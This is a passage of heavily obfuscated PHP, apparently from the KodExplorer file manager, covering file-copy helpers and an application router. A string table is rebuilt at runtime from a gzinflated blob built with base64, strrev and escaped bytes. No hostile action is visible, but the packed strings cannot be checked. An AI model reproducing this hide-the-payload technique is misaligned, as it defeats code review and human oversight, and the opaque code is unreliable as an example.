$CË”œ‰½òù[$añØÙ‡«Îæ[383]]; } goto e­¤Ë´óë; aÕÚˆŸ²¹Ü: } unset($CË”œ‰½òù); if (!empty($E¯³’Í„­)) { $this->addAll($E¯³’Í„­); } goto AğÜ†‡–à; A˜Æ¤ì˜Òä: $añØÙ‡«Îæ =& $_SERVER[İë¬“ÅÒÛ›]; $E‘º‹æïÛÕ = $this->sourceInfoCache($DîÖì°¬ˆ); $dŒï‹á‡²Ú = $BìÂöèƒ‡»->listPath($AÇ¬ÉÉÀ™œ, !1, !0); goto F¾´•Å„¡£; F¾´•Å„¡£: $C¾ŸÚñ˜ÜÓ = array_merge($dŒï‹á‡²Ú[$añØÙ‡«Îæ[74]], $dŒï‹á‡²Ú[$añØÙ‡«Îæ[75]]); $A÷™Ş¹Üê¤ = $this->_addFiles($BìÂöèƒ‡», $dŒï‹á‡²Ú[$añØÙ‡«Îæ[74]], $FÅó¬Êõºİ); $E¯³’Í„­ = array(); goto eçø¿‘‰„; AğÜ†‡–à: $AÌ‘ Â™ = $this->_childrenList($DîÖì°¬ˆ); $AÌ‘ Â™ = array_to_keyvalue($AÌ‘ Â™, $añØÙ‡«Îæ[28]); foreach ($C¾ŸÚñ˜ÜÓ as $CË”œ‰½òù) { $E‹”Šª˜¼¡ = $AÌ‘ Â™[$CË”œ‰½òù[$añØÙ‡«Îæ[28]]]; $c³ªÁëÒ˜Â = $E‹”Šª˜¼¡[$añØÙ‡«Îæ[375]]; $this->_copyApplyMeta($E‹”Šª˜¼¡, $BÂŞ£óô¡); if ($CË”œ‰½òù[$añØÙ‡«Îæ[29]] == $añØÙ‡«Îæ[77]) { $CË”œ‰½òù[$añØÙ‡«Îæ[76]] = $BìÂöèƒ‡»->getPathInner($CË”œ‰½òù[$añØÙ‡«Îæ[76]]); $this->_copyChildTo($BìÂöèƒ‡», $CË”œ‰½òù[$añØÙ‡«Îæ[76]], $c³ªÁëÒ˜Â, $E¤ÍˆÁÊÆ, $BÂŞ£óô¡, $FÅó¬Êõºİ); } } goto f‰øÚŞÕÂ‡; f‰øÚŞÕÂ‡: } private function _addFiles($FáÓ»„Òº, $AÄ†ÎâˆÕ, $F ´¹¹ˆêğ) { goto CºÙî³óØ ; b÷Û˜òøÓ‘: $f¯ÊëëÈÕÂ = array($C‰İ®Êº¿[160] => array($C‰İ®Êº¿[7], array_keys($E³àñŠîò))); $FêÎ¸Ì ƒ = $bîÅƒ¹·å‹->where($f¯ÊëëÈÕÂ)->select(); $FêÎ¸Ì ƒ = $FêÎ¸Ì ƒ ? $FêÎ¸Ì ƒ : array(); goto A¸×™É®É; f–™ôŒ¼É¦: $BÑõ¨±İß = array(); foreach ($AÄ†ÎâˆÕ as $Cíà‹—¿) { if (isset($Cíà‹—¿[$C‰İ®Êº¿[425]]) && $Cíà‹—¿[$C‰İ®Êº¿[425]]) { continue; } $CõÅöÖĞÚï = $FáÓ»„Òº->getPathInner($Cíà‹—¿[$C‰İ®Êº¿[76]]); $E’Ê§ÎÆ· = $bîÅƒ¹·å‹->addFileMake($CõÅöÖĞÚï, $Cíà‹—¿[$C‰İ®Êº¿[78]], $Cíà‹—¿[$C‰İ®Êº¿[161]], $Cíà‹—¿[$C‰İ®Êº¿[160]], $Cíà‹—¿[$C‰İ®Êº¿[28]], $F ´¹¹ˆêğ); $BÑõ¨±İß[] = $E’Ê§ÎÆ·; } $bîÅƒ¹·å‹->addAll($BÑõ¨±İß); goto b÷Û˜òøÓ‘; BÄ‘æÙ§ÂÆ: return $føõÍ—Ø‹; goto EØÇ¸šš·Ğ; F•éƒ•¯²©: $FêÎ¸Ì ƒ = $bîÅƒ¹·å‹->where($f¯ÊëëÈÕÂ)->select(); $FêÎ¸Ì ƒ = $FêÎ¸Ì ƒ ? $FêÎ¸Ì ƒ : array(); foreach ($FêÎ¸Ì ƒ as $C½ƒ£œøŠ†) { if (!isset($E³àñŠîò[$C½ƒ£œøŠ†[$C‰İ®Êº¿[160]]])) { continue; } $bÎ‘†ÒÊ÷œ = $E³àñŠîò[$C½ƒ£œøŠ†[$C‰İ®Êº¿[160]]]; foreach ($bÎ‘†ÒÊ÷œ as &$Cì‚´³÷Ş) { $Cì‚´³÷Ş[$C‰İ®Êº¿[383]] = $C½ƒ£œøŠ†[$C‰İ®Êº¿[383]]; $Cì‚´³÷Ş[$C‰İ®Êº¿[425]] = !0; } unset($Cì‚´³÷Ş); } goto f–™ôŒ¼É¦; cÇŠíÎ­¾÷: foreach ($AÄ†ÎâˆÕ as &$Cì‚´³÷Ş) { goto e†¤¦ì‡¥; Fò¶‚˜½Ş: $e¨Ğ˜˜—½ù = $FáÓ»„Òº->hashMd5($Cì‚´³÷Ş[$C‰İ®Êº¿[76]]); if (strlen($e¨Ğ˜˜—½ù) > 10 && !isset($E³àñŠîò[$e¨Ğ˜˜—½ù])) { $E³àñŠîò[$e¨Ğ˜˜—½ù] = array(); } $Cì‚´³÷Ş[$C‰İ®Êº¿[161]] = $bÅµ”Ğ»ôÈ; goto fï³‚Æ„êª; e†¤¦ì‡¥: Hook::trigger($C‰İ®Êº¿[426], $Cì‚´³÷Ş); $Cì‚´³÷Ş[$C‰İ®Êº¿[76]] = $FáÓ»„Òº->getPathInner($Cì‚´³÷Ş[$C‰İ®Êº¿[76]]); $bÅµ”Ğ»ôÈ = $FáÓ»„Òº->hashSimple($Cì‚´³÷Ş[$C‰İ®Êº¿[76]]); goto Fò¶‚˜½Ş; fï³‚Æ„êª: $Cì‚´³÷Ş[$C‰İ®Êº¿[160]] = $e¨Ğ˜˜—½ù; Hook::trigger($C‰İ®Êº¿[427], $Cì‚´³÷Ş); $E³àñŠîò[$e¨Ğ˜˜—½ù][] =& $Cì‚´³÷Ş; goto cÂÅêĞ¹ï; cÂÅêĞ¹ï: if (count($E³àñŠîò[$e¨Ğ˜˜—½ù]) > 1) { $Cì‚´³÷Ş[$C‰İ®Êº¿[425]] = !0; } goto aŒš†Á·¹; aŒš†Á·¹: } $f¯ÊëëÈÕÂ = array($C‰İ®Êº¿[160] => array($C‰İ®Êº¿[7], array_keys($E³àñŠîò))); $bîÅƒ¹·å‹ = Model($C‰İ®Êº¿[428]); goto F•éƒ•¯²©; A¸×™É®É: foreach ($FêÎ¸Ì ƒ as $C½ƒ£œøŠ†) { if (!isset($E³àñŠîò[$C½ƒ£œøŠ†[$C‰İ®Êº¿[160]]])) { continue; } $cƒ‰Æ®¡·ä =& $E³àñŠîò[$C½ƒ£œøŠ†[$C‰İ®Êº¿[160]]]; foreach ($cƒ‰Æ®¡·ä as &$Cì‚´³÷Ş) { $Cì‚´³÷Ş[$C‰İ®Êº¿[383]] = $C½ƒ£œøŠ†[$C‰İ®Êº¿[383]]; } unset($Cì‚´³÷Ş); } $føõÍ—Ø‹ = array(); foreach ($AÄ†ÎâˆÕ as $c˜îó¶•‹) { $føõÍ—Ø‹[$c˜îó¶•‹[$C‰İ®Êº¿[28]]] = $c˜îó¶•‹; } goto BÄ‘æÙ§ÂÆ; CºÙî³óØ : $C‰İ®Êº¿ =& $_SERVER[İë¬“ÅÒÛ›]; if (!$AÄ†ÎâˆÕ || count($AÄ†ÎâˆÕ) == 0) { return array(); } $E³àñŠîò = array(); goto cÇŠíÎ­¾÷; EØÇ¸šš·Ğ: } } class Application { private $defaultModule = "\151\x6e\x64\145\170"; private $defaultController = "\x69\156\144\145\x78"; private $defaultAction = "\x69\156\144\x65\170"; public function setDefault($cÕí‡·Öã±) { $F¿ñí—·ŠŠ =& $_SERVER[İë¬“ÅÒÛ›]; $BèŒìô÷ì = explode($F¿ñí—·ŠŠ[92], trim($cÕí‡·Öã±, $F¿ñí—·ŠŠ[92])); $this->defaultModule = $BèŒìô÷ì[0] ? $BèŒìô÷ì[0] : $this->defaultModule; $this->defaultController = $BèŒìô÷ì[1] ? $BèŒìô÷ì[1] : $this->defaultController; $this->defaultAction = $BèŒìô÷ì[2] ? $BèŒìô÷ì[2] : $this->defaultAction; } public function appRun($c‘˜±Õ‡ñİ) { goto cÊœëÀŠ±¿; cÊœëÀŠ±¿: $dÖ³Ûİ =& $_SERVER[İë¬“ÅÒÛ›]; $f§‹æ’»¯ = explode($dÖ³Ûİ[92], $c‘˜±Õ‡ñİ); $F ÑëÍŠõµ = strtolower($f§‹æ’»¯[0]); goto CŒŒàùÖÎÏ; CŒŒàùÖÎÏ: $d™·ƒ£‚Õù = $dÖ³Ûİ[429]; if ($F ÑëÍŠõµ == $dÖ³Ûİ[430]) { $d™·ƒ£‚Õù = $dÖ³Ûİ[431]; $f§‹æ’»¯[0] = $dÖ³Ûİ[33]; $f§‹æ’»¯[1] = $f§‹æ’»¯[1] . $dÖ³Ûİ[432]; $c‘˜±Õ‡ñİ = join($dÖ³Ûİ[92], $f§‹æ’»¯); $c‘˜±Õ‡ñİ = trim($c‘˜±Õ‡ñİ, $dÖ³Ûİ[92]); } Hook::trigger($d™·ƒ£‚Õù . $dÖ³Ûİ[433], $c‘˜±Õ‡ñİ); goto a–‹®ç¢Î; a–‹®ç¢Î: ActionCall($c‘˜±Õ‡ñİ); Hook::trigger($d™·ƒ£‚Õù . $dÖ³Ûİ[434], $c‘˜±Õ‡ñİ); goto e¡ÖÛ‚Ñ»¼; e¡ÖÛ‚Ñ»¼: } private function autorun() { $F‰›˜ãÁå =& $_SERVER[İë¬“ÅÒÛ›]; global $config; if (count($config[$F‰›˜ãÁå[435]]) == 0) { return; } foreach ($config[$F‰›˜ãÁå[435]] as $d Šñ¯§Œ => $f§‚®ëÊšÁ) { $this->appRun($f§‚®ëÊšÁ); } } private function parsePluginRoute() { goto A¡ñè¦É; D¶Äì¯Ïö”: $a‰É‰÷ªãÁ = array($A“ŞĞøô›â[430], $FñËù°‘¡); $FíÅšØÎ÷ = array_slice($GLOBALS[$A“ŞĞøô›â[7]][$A“ŞĞøô›â[436]], 1); $GLOBALS[$A“ŞĞøô›â[7]][$A“ŞĞøô›â[436]] = array_merge($a‰É‰÷ªãÁ, $FíÅšØÎ÷); goto cÈ†Âœ­‡‘; cÈ†Âœ­‡‘: $GLOBALS[$A“ŞĞøô›â[7]][$A“ŞĞøô›â[437]] = implode($A“ŞĞøô›â[92], $GLOBALS[$A“ŞĞøô›â[7]][$A“ŞĞøô›â[436]]); goto E†ğâ„´ÚÓ; F‚à±³Ğ³¤: if (!$AîÛ°ŞŸò || strlen($AîÛ°ŞŸò) <= strlen($eŠ´¾¯°â)) { return; } if (strtolower(substr($AîÛ°ŞŸò, -strlen($eŠ´¾¯°â))) != $eŠ´¾¯°â) { return; } $FñËù°‘¡ = substr($AîÛ°ŞŸò, 0, -strlen($eŠ´¾¯°â)); goto D¶Äì¯Ïö”; A¡ñè¦É: $A“ŞĞøô›â =& $_SERVER[İë¬“ÅÒÛ›]; $eŠ´¾¯°â = $A“ŞĞøô›â[430]; $AîÛ°ŞŸò = $GLOBALS[$A“ŞĞøô›â[7]][$A“ŞĞøô›â[436]][0]; goto F‚à±³Ğ³¤; E†ğâ„´ÚÓ: } private function parseUriRoute() { goto dÉ²•ï¹Ø¢; dÉ²•ï¹Ø¢: $aˆŒƒØ®¦“ =& $_SERVER[İë¬“ÅÒÛ›]; if ($GLOBALS[$aˆŒƒØ®¦“[7]][$aˆŒƒØ®¦“[437]] != $aˆŒƒØ®¦“[33]) { return; } $c¦ğÌ” Ÿ« = $_SERVER[$aˆŒƒØ®¦“[438]]; goto fµî¹“©»; fµî¹“©»: $e¥µ›“Ë‘å = $aˆŒƒØ®¦“[439]; if (!strstr($c¦ğÌ” Ÿ«, $e¥µ›“Ë‘å)) { return; } $C¼¦Ó©Ğë‚ = strrpos($c¦ğÌ” Ÿ«, $e¥µ›“Ë‘å); goto E‹ñ‘ƒâªå; c™²ä¾¶ğ¼: $GLOBALS[$aˆŒƒØ®¦“[7]][$aˆŒƒØ®¦“[436]] = explode($aˆŒƒØ®¦“[8], $Cºä³ë®); $GLOBALS[$aˆŒƒØ®¦“[7]][$aˆŒƒØ®¦“[437]] = implode($aˆŒƒØ®¦“[92], $GLOBALS[$aˆŒƒØ®¦“[7]][$aˆŒƒØ®¦“[436]]); goto D² í° ƒÉ; E‹ñ‘ƒâªå: $Cºä³ë® = substr($c¦ğÌ” Ÿ«, $C¼¦Ó©Ğë‚ + strlen($e¥µ›“Ë‘å)); preg_match_all($aˆŒƒØ®¦“[440], $Cºä³ë®, $A¯•â‘‡); $Cºä³ë® = trim($A¯•â‘‡[0][0], $aˆŒƒØ®¦“[8]); goto c™²ä¾¶ğ¼; D² í° ƒÉ: } public function run() { goto cÂ£²¯ëø’; A–œÛêàÜ: $AÄ—õ¦ÚŒ² = $GLOBALS[$b«ßîÊêÊ [7]][$b«ßîÊêÊ [436]]; $fØíœ¸‚ğ = $GLOBALS[$b«ßîÊêÊ [7]][$b«ßîÊêÊ [437]]; define($b«ßîÊêÊ [441], isset($AÄ—õ¦ÚŒ²[0]) && $AÄ—õ¦ÚŒ²[0] ? $AÄ—õ¦ÚŒ²[0] : $this->defaultModule); goto BŞ‘çÏ”„; BŞ‘çÏ”„: define($b«ßîÊêÊ [442], isset($AÄ—õ¦ÚŒ²[1]) && $AÄ—õ¦ÚŒ²[0] ? $AÄ—õ¦ÚŒ²[1] : $this->defaultController); define($b«ßîÊêÊ [443], isset($AÄ—õ¦ÚŒ²[2]) && $AÄ—õ¦ÚŒ²[0] ? $AÄ—õ¦ÚŒ²[2] : $this->defaultAction); define($b«ßîÊêÊ [444], MOD . $b«ßîÊêÊ [92] . ST . $b«ßîÊêÊ [92] . ACT); goto eÌñ‹”ãª¥; cÂ£²¯ëø’: $b«ßîÊêÊ  =& $_SERVER[İë¬“ÅÒÛ›]; $this->parseUriRoute(); $this->parsePluginRoute(); goto A–œÛêàÜ; eÌñ‹”ãª¥: $this->autorun(); if (count($AÄ—õ¦ÚŒ²) >= 3) { $this->appRun($fØíœ¸‚ğ); } else { $this->appRun(ACTION); } goto aÂÜà…§”ó; aÂÜà…§”ó: } } goto d‘…İŸ…Ì‰; déššÂ­ºó: if (!function_exists('_kodDe')) { function _kodDe($C¿Êèäï•Ê) { $C¿Êèäï•Ê = base64_decode($C¿Êèäï•Ê); $e™¦Û¯É°Ø = strlen($C¿Êèäï•Ê); $b¬î½›öîÑ = ''; $fêóŠº­Î = ord($C¿Êèäï•Ê[0]) - 30; for ($e¹ù‚ÁêÙì = 1; $e¹ù‚ÁêÙì < $e™¦Û¯É°Ø; $e¹ù‚ÁêÙì += 2) { if ($e¹ù‚ÁêÙì + 1 < $e™¦Û¯É°Ø) { $b¬î½›öîÑ .= chr(ord($C¿Êèäï•Ê[$e¹ù‚ÁêÙì + 1]) + $fêóŠº­Î); $b¬î½›öîÑ .= chr(ord($C¿Êèäï•Ê[$e¹ù‚ÁêÙì]) + $fêóŠº­Î); } else { $b¬î½›öîÑ .= chr(ord($C¿Êèäï•Ê[$e¹ù‚ÁêÙì]) + $fêóŠº­Î); } } return $b¬î½›öîÑ; } } define("\xdd\xeb\xac\x93\xc5\xd2\xdb\x9b", "\222\300\246\350\370"); $_SERVER[İë¬“ÅÒÛ›] = explode("\174\4\174\5\174\3", gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\235\175\11\140\123\125\326\260\353\250\214\72\70\56\203\373\243\2\135\310\322\226\105\54\224\222\46\151\33\111\223\222\244\24\150"."\xca\xe3\x35\x79\x6d\x1f\x4d\xf2\xc2\x7b\x2f\x5d\x58\x74\x74\x84\x1\x1d\x50\xdc\x77\x67\x5c\x71\x54\x14\x47\x11\x17\x5c\x61\xc4\xd\x75\x50\x41\x74\x74\x1c\x5\x84\xc1\x7d\xf9\xdc".base64_decode('/e9+70tS//k+l+bec/d7zz33nHPPPe+Spc/c/9bOLa8tPmTxoYsPfuKFpf95').base64_decode('d/MH2z78HMcXHwR+D8Th0y86/AD0z8HpS1698OnK4f4Ziz8f+8MB6+r+8sIj')."\xf7\xdd\xd3\xf2\xd4\x92\x59\x87\x27\xaa\x77\x4e\x7b\xf1\x82\xbd\xc7\xf9\xbf\xfb\xec\xd1\x49\xaf\xcf\xfc\x6c\xb4\x39\xe6\xed\x45\xa5\x27\x6e\x5b\xf5\x56\x60\xf2\x77\x63\xfe\xe8\xa9"."\332\166\377\53\227\326\233\137\316\30\34\67\257\111\133\375\327\133\137\272\263\377\335\117\117\123\16\176\55\347\376\333\161\113\313\17\371\140\377\340\153\27\255\175\317"."\265\177\352\376\207\216\15\75\50\215\133\327\371\355\354\375\57\266\315\376\140\214\173\175\327\127\177\173\147\337\217\247\375\146\323\254\231\53\47\325\364\227\237\56\15"."\357\272\353\235\307\16\136\65\365\264\107\107\51\272\377\254\322\317\116\270\342\252\253\107\70\17\257\371\350\253\353\237\70\171\334\362\265\63\216\234\353\30\363\331\161"."\xcd\x87\xbe\xfa\xe3\xcf\xdf\xdd\xb0\xe7\xeb\x35\xe7\xbd\xfa\xe4\x53\x87\x2d\xde\x3f\xe9\xf\xd\x65\xc3\x37\x9c\x33\xf9\xaf\x65\x3f\x1e\x2f\x7f\x9f\xfb\xe1\xe0\x23\x97\x76\x1e\xb0"."\365\300\3\16\300\143\255\301\77\122\106\267\44\165\100\63\55\23\3\22\172\246\113\353\306\141\55\203\177\335\370\307\134\220\322\54\25\207\345\120\70\46\107\133\133"."\132\374\221\230\114\152\24\323\323\172\222\204\262\212\241\244\111\345\131\325\60\101\123\142\165\162\126\317\252\31\33\204\3\222\212\245\164\52\46\251\311\127\57\373\374".strrev('7QBx‹ıê¿X7èå•iiŠÃµ(cˆ1ªrÊtrOÅ»69lğÁ-').base64_decode('CIcw2Btubg7ECuGRcDBY7/FOL0xpiXgamz0S6F9KlbVMl14mzcMp86RyHGjQ')."\xd4\x54\x12\x7\x33\xa\xed\x8e\x35\x98\x25\xa1\x18\xb\x81\x35\xc8\xe4\x52\x29\x1c\x9\xb1\x10\xe9\xbf\xda\xa5\xe4\x52\x64\xce\x7c\x62\x24\x6b\x68\x69\x85\xe\x7d\xba\x3a\xc8\xa0"."\70\240\344\54\135\313\44\160\304\77\140\31\12\207\203\36\47\14\65\255\146\110\125\121\177\320\357\215\111\260\233\122\103\44\334\54\221\245\110\53\246\245\32\122\133"."\223\77\342\227\140\327\153\113\321\210\113\45\134\256\65\4\46\104\362\4\203\322\120\65\130\152\72\113\253\301\145\212\124\26\216\370\374\21\251\176\266\304\347\51\241".strrev('%”®ÉbÚ–ã\' ‚3pdbÏÔCCp‘#¥À à8"Gõ]	iëjÆzÓ§').strrev('[îÉĞ*Ë¥@H‡¶Må›®…RVA´e ^n¯È~J[ü^ÖE©)÷')."\xad\xf\x7\x6b\xa7\xe2\xdf\xc9\x24\x53\xa7\xc\xd3\x54\xc3\x92\xd5\x4c\x42\x4f\x6a\x19\xb2\x21\xeb\xc8\xe6\x23\x28\xa8\x58\x3d\x3e\x43\x3\xf9\x48\x85\xba\x2b\xa1\x67\x7\x9b\xf5".base64_decode('PjKaLi2lBtl+69JTSdXg8SwoLqaQYWkLhdKhXFrMwqKJHi2VNOg2/aWcpmpZ')."\240\377\46\355\142\153\66\245\53\311\250\152\260\156\347\20\244\101\67\322\76\260\335\311\14\0\44\327\132\213\44\364\122\64\117\12\3\307\65\320\245\362\366\344\62"._kodDe('KEezAiyXDVtX3eN1L17g/JWK9HgJHQziU0lHTx9GE1S/HT+OHfGqqWTBSfeu+g==')."\x47\x3\x61\xb9\x47\x31\x7b\x9a\x93\x13\x64\x54\x8a\xd2\xc9\xa4\x3a\xe0\xca\xf6\x64\xc9\x62\xb3\x1d\x4c\x90\x18\xce\x74\x48\xb7\xfc\x2\x99\x4d\xe9\x9\x85\x64\xea\xb1\xac\x6c\x54"."\xcd\x24\x1b\xc0\x2c\x92\xb1\xe9\xfd\x19\x34\x4b\x59\x55\x25\xc3\xf2\x39\xa4\xa4\xd4\x2c\xcd\x96\x9a\x6a\xb4\x1a\x86\x70\x49\xad\x6b\x90\x53\xba\x1e\x2b\xcd\xaa\xa4\xb3\xcf\x61\x26"."\x3\x5a\x3\x4\x3\x4a\x48\x5c\x1d\xb0\xc8\x8c\x48\x93\x13\x3d\x8a\x1\xd6\xac\x36\x67\x75\x39\x27\x11\x82\x91\xcd\xa6\xb4\x84\x62\x69\x7a\xc6\xad\x27\x2c\xd5\x72\x9a\x96\xa1\x2a".strrev('Á©º³3O›4\\£*L	æA?N¥ÙŒ”3ÖÛÆz¼kº)p+s¸\\É’¶¤')."\146\152\44\305\262\224\104\17\334\365\274\372\332\137\310\257\145\122\132\106\55\310\353\111\44\124\323\164\302\42\206\236\162\172\122\51\275\337\31\66\264\156\15\224\251"."\310\353\46\240\110\65\22\45\227\131\315\120\115\32\225\32\233\143\44\63\350\225\352\154\61\224\356\264\122\43\145\163\235\140\146\310\156\54\2\303\271\111\353\65\122"."\x2\x46\x1d\x52\x3a\x67\x5a\x4e\x43\x5\x64\x47\x3\x7\x1c\x59\xbc\x40\x97\xb3\x19\xae\xa7\xa6\x26\x9d\x51\x40\x9d\x9\x78\x5c\xe5\x78\x9\xa0\x8e\x44\xd3\x30\xb4\x29\x16\x6b\x91".base64_decode('Aw3gEA755WZPzNtEum0p3bTPQUBzWZUUOMsZzlkQ0UJgjjiwRe9XDdBw/WCN')."\324\253\47\73\365\1\27\115\202\231\341\146\242\231\341\214\146\55\147\104\311\164\303\371\351\34\264\124\223\236\41\221\231\376\210\34\15\67\304\332\74\21\162\76\147"."\xc0\x4c\xf\xd0\xba\x60\xd9\x94\x33\xa2\x26\xc1\xdc\x26\x2c\x5a\xa3\x92\x85\xd3\x42\xf3\xc0\x9d\x0\x17\x91\xa6\xc2\xdd\x41\xd3\x82\x81\x46\x38\x72\x9f\xd3\x4\x99\x9c\x62\x2e\x5a".strrev('®UÜeã[GEW>ãÛÊ+î[,¢§¼mqê7!ÒFïSAKs°kKPw')."\52\251\272\162\242\324\2\270\11\115\111\111\4\115\12\162\124\112\341\351\166\104\12\252\231\156\253\207\60\130\21\377\214\126\177\64\46\67\373\143\115\141\37\51\355".strrev('u8ºÖîæéR<P˜RPİ)èM[¿£€ÊÈ:ÒG-ã¨,Y1nÜjèøø÷')."\0\6\205\64\202\311\27\217\104\265\164\226\22\36\253\47\227\356\24\202\156\136\3\41\42\140\245\30\271\321\331\111\242\33\44\304\172\77\272\272\201\122\114\167\164".base64_decode('HPiPk8eknlYoZ4k2pJrEOxKDKmwpTarCjybLsHQINWxZmlWrRycbo1ulXcqx')._kodDe('KcazG1OJylw/PJ7cmlX674zZzTsW+4NDQlaFLTmoGM97Bpr7oQlhwx2lfjtbNQ==')."\xdd\x90\xad\xa1\xf1\x36\xc8\x7d\x72\x80\xc5\xe9\xb5\x22\x34\x1\x23\x42\x13\xd\xad\xc1\xa0\xec\xd\x87\x62\x80\x3\xc5\x90\xb6\x48\x20\xe6\xa7\x38\xe5\xf1\xc9\x1e\x6f\xb\x3b\xae"."\xf8\x6a\x92\xc\x70\x77\x16\x52\x37\xc\xe9\xab\x16\xc8\x3e\x3f\x1f\x38\xc5\xa5\x87\x1a\xa4\xa8\x38\xc\x48\x61\x56\xcf\x98\xaa\x33\x41\x6a\x4b\x72\xda\x8b\x73\x4c\xce\x23\xbc\x5"."\45\70\337\73\340\124\322\13\235\151\325\122\234\254\353\363\263\204\303\311\122\126\147\176\126\45\241\316\164\126\100\171\176\260\367\153\111\312\300\364\250\132\167\17\145"."\221\155\47\245\24\23\131\204\0\131\164\116\166\123\340\110\6\22\12\75\226\133\302\121\122\240\16\102\1\27\323\251\32\144\110\55\255\44\51\55\40\134\243\237\0"."\x87\xd1\x53\x56\xa9\x22\xd8\xd9\x16\xa5\x24\x33\x7\xf2\x1b\xda\x42\x85\x4f\x57\x1d\xed\xf\xa9\x7b\x20\x9d\xe2\x8c\x59\xac\x29\x10\x9a\x2e\x37\x87\x7d\xfe\xa0\x1c\x8\x1\xb2\x1a"."\53\204\267\266\370\74\24\35\104\170\175\70\326\144\203\266\2\332\63\323\23\14\344\147\367\317\12\104\143\321\242\111\0\326\352\317\113\1\262\127\113\304\337\20\230"."\305\242\15\1\177\320\27\225\275\36\157\23\317\23\362\64\223\210\334\5\245\37\323\155\317\57\203\23\42\312\144\50\271\17\312\203\164\116\144\233\300\42\123\126\134"."\xe6\x98\x3\x4e\x33\x95\x60\x2b\x19\x2e\x94\x42\xd1\x48\x8\x4b\x9c\xd0\x73\x14\x7f\x19\xb\x97\xa6\x94\x25\xad\x90\x3d\xab\xf4\x11\xd4\x2a\xc3\x3f\xe5\x92\x27\x2a\x59\x59\x99\xd1"."\x90\xce\x41\x16\x44\xc3\xa0\x71\xc0\xb3\x91\xf6\x25\x42\xd0\xb\x7a\x20\xc3\x3c\xf5\x6a\x97\x6e\xa8\xbf\x4\xf0\x74\x59\x74\xab\xe7\xc7\xc1\x4e\xe2\x69\x60\x5\x3c\x48\xdc\x5\x98".base64_decode('gFZEprvTBOKBh3ani4uachjI5B4oqMptkXCokRTo71FpBwJk+ssod0PkVYsT')."\x29\xc0\x9a\x28\x9c\xcb\xa4\x93\x3e\x5f\xa7\x53\xb9\x18\xff\x8c\x21\x3b\x14\x30\xc0\xe4\xf4\xc9\xd0\x59\xef\x84\x14\x9d\x91\x12\x2a\x82\x0\xa4\xa7\xd4\x58\xcf\xb1\xd6\x3a\x75\x3d"."\x45\xb7\x23\x38\xbf\x19\x5\x61\x92\xee\x7c\x93\x22\xc9\x0\x25\x57\x63\x49\x83\x3\x84\x38\xc4\xc2\xd3\xfd\x21\x99\x62\x16\x8e\x9\xd8\x88\x1\x40\x76\xc\x47\xc8\x84\x58\x7a\x2f".strrev('w$£†˜¯(®±Îíe±şñ¹îóH¸8*Å‚X×n]:4äPÙ›¥Äbp_•')."\xd9\xa2\xa3\x48\xf9\x9c\xc1\x4a\xc3\xb3\xbe\xcc\xac\x2b\xaf\x89\xbb\xe3\xee\xb2\xba\x9a\x76\x8f\x73\xa1\xe2\x5c\x58\xe9\x3c\xcb\xd9\x31\x36\xee\x2a\x1f\x4b\x0\x1d\x8b\xaa\x1d\xe3".base64_decode('l8AMIGPdGR3gpzZeNzruHHPOvGnt8Y7SmrEj464z4v0dFeV1tJ1EzgCyWWKQ')."\165\65\71\266\14\164\11\260\73\54\113\6\121\66\41\3\115\130\250\145\71\164\321\304\45\24\16\326\120\355\346\45\332\235\361\261\35\165\102\71\1\224\337\26\140".strrev('ÿ4^±2`€BÛî´B	*t_p’\'™r?÷Ü(¬dp9Î<ùaí™'."\0".'‡')."\56\241\13\331\255\322\203\32\52\266\14\202\235\271\214\266\200\312\374\31\165\1\11\350\26\305\357\116\325\352\127\51\172\0\270\55\16\220\203\312\156\40\111\210\245"."\x10\xe3\x47\x5a\xe0\xf2\x93\x8a\x84\x9\x32\x8a\xac\xc\xf9\xb5\x7e\x16\x4b\xaa\x19\xb2\x4e\x47\x90\xdc\x66\x42\xc9\xaa\x51\x61\x84\xb2\x1c\xf3\xd4\x7\xfd\x32\xa5\x30\x84\x12\xd3".base64_decode('OKKK9UxLBobGKSoTRDmLLYuTl1UonwBFVXb2u8vi8Vy7muxoBwipOLs6Fo1b')."\122\116\271\143\167\34\374\103\43\230\16\221\226\263\174\35\114\300\154\45\54\166\376\25\50\234\144\106\311\140\27\230\266\100\67\70\223\5\340\234\155\265\164\113\111"."\xb1\x6c\x30\x2d\x6\x21\x94\x6a\xd0\xa3\x13\x72\x15\x82\xda\xd\x51\xb4\x10\xd3\x29\x9\x8a\x1e\xa6\x47\xb0\xc3\x1c\x42\x14\xff\xad\x25\x42\x72\xc0\xe7\x24\xd3\xed\x99\xe5\xc\x10".strrev('ñeİ¯áñÜqNß„ü9VÚ¬vgKËõÌ8!ïàËR~şÎïÚçø£àÒ4ö').base64_decode('A2cMu6LihNyvp0ixwcu03tdXnvFW+ckPHPavA045/+TsGV+ftOOzHe9vKH/s').base64_decode('gS9WPvvF94M7l5Wveamz7+cPf3rux8TPd6p3nX14zdzvP1l2zcargtsPuHHv')."\xc3\xc7\x1d\x5f\x76\xf1\xfa\x3b\x5f\x3c\x74\xe7\x88\xdb\xfb\xe6\xbd\xf1\xd9\xd1\x6f\x9f\x58\x3d\x32\xf7\xd2\xaa\x96\xd\x23\x96\x9a\xf2\xac\xbb\xea\xbf\xf8\xa4\xe5\xf2\x61\x57\x9f".base64_decode('N+GhOxpnf5beftGiZasXPVdTUXbkhRfNfuqrIw8ZUbbm/BO3r5x3w8oP9s19')."\xfa\x8\xdf\x31\xfb\xfc\xea\xb9\xc7\x6c\xfc\xfe\xc3\xd3\x1f\x3c\x7e\xc9\x97\x73\x93\xf7\x34\x7f\x71\xf8\x32\xe7\xbe\x7b\x8e\xdc\x7e\xc3\x88\x47\x3e\x9f\xbd\xe0\xe0\xfd\x6f\xdc\xbe"."\xf9\xab\x61\xb3\x5e\xbf\x68\xf2\xe8\xb7\x76\x7b\xf\x5f\x2d\xdd\x74\x68\x45\xd9\xe6\x35\xb3\x2\x2b\x9c\xcf\x1c\xe0\x9a\x1a\xb8\xe9\xea\x9e\x75\x2b\x5e\x73\x5c\x7c\x67\x62\xef\xc3"."\167\215\254\55\335\137\363\361\155\123\152\357\315\135\151\366\235\255\175\356\176\376\360\265\125\13\346\36\365\304\77\37\60\265\77\315\373\171\354\362\205\341\43\326\276"."\xf9\xf1\x98\xc0\x4b\xf7\x75\x6c\x79\xe1\xae\xb6\x96\xbe\xdb\x96\x1f\xf9\xf5\x71\x27\x7a\x57\xff\xae\xf6\xcc\x67\xf\x9f\x18\xba\x78\xcb\x8d\x77\xb4\xb5\x9d\xf7\xc1\xa6\x7b\xe\xfc".base64_decode('wlV9/fMPZ468KuDVb602j775pL+ubV28KP2HD1657XcV3x51amy4FXj8LzvP').strr